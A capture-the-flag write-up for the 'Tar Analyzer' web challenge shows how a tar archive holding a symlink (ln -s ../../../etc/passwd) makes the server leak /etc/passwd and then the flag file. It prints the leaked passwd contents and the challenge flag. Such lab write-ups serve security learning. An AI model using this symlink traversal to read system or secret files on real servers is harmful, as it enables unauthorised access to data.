# Tar Analyzer

##### Category: Web

#### Description     
Our developer built simple web server for analyzing tar file and extracting online. He said server is super safe. Is it?

#### Server     
http://tar-analyzer.ctf.defenit.kr:8080/

#### Attachments    
[tar-analyzer.tar.gz](tar-analyzer.tar.gz)

------------------------

We found the unexpected solution for this.

Using the symbolic link vector, a common zip file unpacking vulnerability, we first tried to read the `/etc/passwd`.

```
ln -s ../../../etc/passwd aaa
tar -cvf test.tar aaa
```

This returns the `/etc/passwd` on the server as follows.

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
analyzer:x:1000:1000:Linux User,,,:/home/analyzer:
```

Hence we tried to guess the filename, starting with the common `flag.txt`.


```
ln -s ../../../flag.txt aaa
tar -cvf test.tar aaa
```

And done! We got the flag just like that.

<details>
  <summary>FLAG</summary>
  
  `Defenit{R4ce_C0nd1710N_74r_5L1P_w17H_Y4ML_Rce!}`
</details>